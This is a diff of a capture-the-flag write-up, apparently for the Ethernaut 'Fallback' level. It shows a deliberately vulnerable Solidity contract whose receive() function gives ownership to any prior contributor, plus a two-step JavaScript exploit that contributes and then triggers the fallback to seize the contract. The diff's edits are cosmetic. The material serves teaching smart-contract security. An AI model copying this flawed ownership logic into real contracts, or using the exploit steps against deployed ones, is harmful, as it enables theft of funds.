@@ -7,31 +7,32 @@
 
 **Target contract:**
 
-```solidity
+```sol
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
-import "@openzeppelin/contracts/utils/math/SafeMath.sol";
-
 contract Fallback {
-  using SafeMath for uint256;
+
   mapping(address => uint) public contributions;
   address public owner;
 
-  constructor() payable {
+  constructor() {
     owner = msg.sender;
     contributions[msg.sender] = 1000 * (1 ether);
   }
 
-  modifier onlyOwner() {
-    require(msg.sender == owner, "caller is not the owner");
-    _;
-  }
+  modifier onlyOwner {
+        require(
+            msg.sender == owner,
+            "caller is not the owner"
+        );
+        _;
+    }
 
   function contribute() public payable {
-    require(msg.value < 0.001 ether, "insufficient funds");
+    require(msg.value < 0.001 ether);
     contributions[msg.sender] += msg.value;
-    if (contributions[msg.sender] > contributions[owner]) {
+    if(contributions[msg.sender] > contributions[owner]) {
       owner = msg.sender;
     }
   }
@@ -45,7 +46,7 @@ contract Fallback {
   }
 
   receive() external payable {
-    require(msg.value > 0 && contributions[msg.sender] > 0, "insuff. value contribution");
+    require(msg.value > 0 && contributions[msg.sender] > 0);
     owner = msg.sender;
   }
 }
@@ -60,12 +61,12 @@ The receive function is flawed, we just need to send some value via contribute a
 
 ```js
 // (1) Contribute
-await contract.contribute({value: '1'});
+await contract.contribute({ value: "1" });
 
 // (2) Fallback
 await contract.sendTransaction({
   from: player,
-  value: '1',
+  value: "1",
   data: undefined, // for the fallback
 });
 
